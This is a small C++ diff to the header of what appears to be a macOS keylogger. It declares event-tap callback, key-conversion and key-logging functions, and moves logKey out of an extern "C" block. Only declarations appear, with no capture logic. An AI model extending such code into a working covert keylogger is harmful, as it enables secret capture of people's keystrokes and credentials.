@@ -9,8 +9,8 @@ namespace KeyLogger {
     extern "C" {
         void Init();
         void Run();
-        void logKey(int keyCode);
         CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
         const char *convertKeyCode(int);
     }
+    void logKey(int keyCode);
 }
